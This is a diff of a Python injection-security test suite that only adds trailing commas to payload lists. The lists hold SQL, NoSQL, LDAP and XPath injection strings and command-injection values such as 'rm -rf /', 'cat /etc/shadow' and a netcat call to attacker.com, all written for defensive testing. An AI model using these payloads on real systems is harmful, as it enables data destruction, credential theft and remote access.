@@ -27,7 +27,7 @@ class TestInjectionSecurity:
             "' OR 1=1 --",
             "admin'--",
             "' OR 'a'='a",
-            "1' OR '1'='1' /*"
+            "1' OR '1'='1' /*",
         ]
 
         # Test SQL injection in various parameter contexts
@@ -51,7 +51,7 @@ class TestInjectionSecurity:
             {"$ne": None},
             {"$regex": ".*"},
             {"$where": "function() { return true; }"},
-            {"$exists": True}
+            {"$exists": True},
         ]
 
         for payload in nosql_payloads:
@@ -67,7 +67,7 @@ class TestInjectionSecurity:
             "`id`",
             "&& rm -rf /",
             "; cat /etc/shadow",
-            "| nc attacker.com 4444"
+            "| nc attacker.com 4444",
         ]
 
         for payload in command_injection_payloads:
@@ -81,7 +81,7 @@ class TestInjectionSecurity:
             "*)(|(password=*))",
             "admin)(&(password=*))",
             "*))%00",
-            "*)((|userPassword=*))"
+            "*)((|userPassword=*))",
         ]
 
         for payload in ldap_payloads:
@@ -95,7 +95,7 @@ class TestInjectionSecurity:
             "'] | //user/*[contains(*,'admin')] | //user['",
             "' or 1=1 or ''='",
             "x'] | //password | //user['",
-            "'] | //node() | //user['"
+            "'] | //node() | //user['",
         ]
 
         for payload in xpath_payloads:
